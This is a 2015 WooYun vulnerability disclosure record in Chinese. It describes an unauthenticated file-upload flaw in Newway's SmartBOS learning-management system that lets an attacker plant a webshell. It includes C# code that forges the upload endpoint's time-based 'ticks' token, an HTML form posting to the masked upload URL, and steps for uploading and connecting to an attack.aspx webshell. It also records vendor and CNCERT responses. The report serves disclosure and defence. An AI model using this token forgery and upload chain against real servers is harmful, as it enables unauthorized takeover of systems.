{"id": 81418, "wybug_id": "wooyun-2015-0153730", "wybug_title": "新为某通用系统配置不当致文件上传getshell（无需登陆）", "wybug_corp": "新为软件", "wybug_author": "路人甲", "wybug_date": "2015-11-25 14:46", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "默认配置不当", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["默认配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-30：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 新为某通用系统配置不当致文件上传getshell（无需登陆）  详细说明：  该系统是新为软件的smartbos管理系统，新为软件是目前中国最大的学习管理软件提供商之一。该系统的使用量非常之大，先来看看官方给的使用情况吧企业：http://**.**.**.**/case_enterprise.html教育：http://**.**.**.**/case_college.html政府：http://**.**.**.**/case_government.html部分案例截个图\n\n1、由于配置不当，致使某个上传页面可以访问，虽然在上传时需要验证参数ticks，但是经过多次尝试，破解了该ticks的计算方法，可以成功文件上传页面。2、上传时需要提供网站的绝对路径，这里通过破解的ticks可以成功得到网站的绝对路径。首先说明如何突破参数ticks的限制，看到这个参数的名字，应该差不多猜到了这里是对时间进行了一次验证，通过多次的尝试与猜解，最后判断出该参数ticks是这样计算出来的：\n\n为了审核大大测试方便，把C#的代码也贴上吧\npublic static string Encode()        {            string str = DateTime.Now.ToString(\"yyyy-MM-dd HH:mm:ss\");            int num = new Random(Guid.NewGuid().GetHashCode()).Next(10);            string str2 = num.ToString();            for (int i = 0; i < str.Length; i++)            {                string str3 = (str[i] + num).ToString(\"x4\");                str2 = str2 + str3;            }                       return str2;        }\n上面的Encode方法的返回值，即为参数ticks的值，可以看出，ticks的计算是以当前时间为基础的，经过测试，该值在一个小时内可用，若超过一个小时，需要重新运行Encode方法计算ticks的值。下面说下ticks是如何使用的：先写个页面来获取网站的绝对路径，如下：\n\n代码也贴这里吧\n<form method=\"post\" action=\"http://**.**.**.**/fileservice/SingleFileUpload.aspx?openerName=ResFileManager&TargetRootPath=&upDirectory=&ticks=6003800360037003b00330037003700330037003800260036003800400038003a0040003a003f\"><input type=\"submit\" name=\"test\"></form>\n请仔细看图中的标注，把运行Encode方法计算的ticks替换上图中的ticks，这样提交后，会得到一个如下的页面：\n\n查看页面源码可以找到网站的绝对路径\n\n然后选择马儿进行上传，会发送两个包，burp抓第二个包，可以看到在上一步获得的网站绝对路径，这里一般不用修改，直接Forward，（如果修改的话，经过测试发现，随着ticks第一位数字的不同，修改后的路径可能生效，也可能无效，原因未知）如下图\n\n完成上传，若上传路径未修改，上传后的路径为：D:\\Newway\\SmartExam\\Web\\fileroot\\attack.aspx访问路径为：http://**.**.**.**/fileroot/attack.aspx用刀连接之\n\n\n\n点到为止   漏洞证明：  见 详细说明   修复方案：  控制访问权限   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-11-27 15:35 厂商回复： CNVD确认所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}